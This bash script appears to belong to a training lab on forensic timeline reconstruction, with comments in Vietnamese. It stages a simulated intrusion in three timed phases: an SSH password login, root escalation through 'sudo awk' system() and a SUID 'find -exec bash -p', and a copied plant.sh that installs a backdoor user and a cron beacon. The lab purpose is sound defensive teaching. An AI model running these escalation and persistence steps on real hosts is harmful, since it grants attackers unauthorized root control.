#!/bin/bash
# Ke tan cong THUC TE, chia 3 GIAI DOAN TACH BIET de dung lai TIMELINE (moc gio khac nhau):
#   (1) ACCESS      : dang nhap tai khoan thuong (ghi 'Accepted ... from attacker' vao auth.log)
#   (2) ESCALATION  : ~2' sau, leo len root qua sudo awk (chung minh ca SUID find)
#   (3) PERSISTENCE : ~2' sau, cai NHIEU LOP persistence (plant.sh -> useradd ghi 'new user')
# Ten ca nhan hoa (EMPNUM). Cac moc gio di vao auth.log -> SV doc lai tu SIEM/auth.log.
TARGET=target
VICTIM=empEMPNUM;  VPW=Password123
BDUSER=svc-EMPNUM
OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 \
-o PreferredAuthentications=password -o PubkeyAuthentication=no"
run_v() { sshpass -p "$VPW" ssh $OPTS "$VICTIM@$TARGET" "$1" 2>/dev/null; }

# Cho sshd san sang
for i in $(seq 1 90); do
  timeout 3 bash -c "echo > /dev/tcp/${TARGET}/22" 2>/dev/null && break
  sleep 2
done
sleep 60   # cho target hoan tat cau hinh (sudoers/SUID/rsyslog)

# ===== (1) INITIAL ACCESS: dang nhap tai khoan thuong -> moc TIME_ACCESS =====
until run_v "id >/dev/null 2>&1"; do sleep 5; done

sleep 120   # khoang cach de moc TIME_ESCALATION tach ro khoi TIME_ACCESS trong log

# ===== (2) PRIVILEGE ESCALATION: leo len root qua sudo awk -> moc TIME_ESCALATION =====
# Retry den khi thanh cong (sudo log 'COMMAND=/usr/bin/awk' phai xuat hien de SV doc duoc moc nay).
# Xac nhan qua /tmp/.rootproof (644 -> tai khoan thuong doc duoc).
for i in $(seq 1 12); do
  run_v "sudo -n awk 'BEGIN{system(\"id > /tmp/.rootproof 2>/dev/null; chmod 644 /tmp/.rootproof 2>/dev/null; echo escalated_via_sudo_awk >> /root/.breach 2>/dev/null\")}'"
  run_v "test -s /tmp/.rootproof" && break
  sleep 10
done
# Chung minh duong SUID find cung leo quyen duoc (bang chung cho VECTOR1)
run_v "find /etc/hostname -exec /bin/bash -p -c 'echo also_escalated_via_suid_find >> /root/.breach' \\;"

sleep 120   # khoang cach de moc TIME_PERSIST tach ro khoi TIME_ESCALATION

# ===== (3) PERSISTENCE: cai NHIEU LOP (plant.sh). Retry den khi backdoor ton tai -> moc TIME_PERSIST =====
for i in $(seq 1 15); do
  sshpass -p "$VPW" scp $OPTS /home/ubuntu/plant.sh "$VICTIM@$TARGET:/tmp/plant.sh" 2>/dev/null
  run_v "sudo -n awk 'BEGIN{system(\"bash /tmp/plant.sh 2>/dev/null\")}'"
  run_v "id $BDUSER >/dev/null 2>&1" && break
  sleep 20
done

# Khong beacon bang SSH lai nua: cronjob doc (plant.sh da cai) tu chay moi 2' = tin hieu dinh ky.
# Giu container song.
while true; do sleep 3600; done
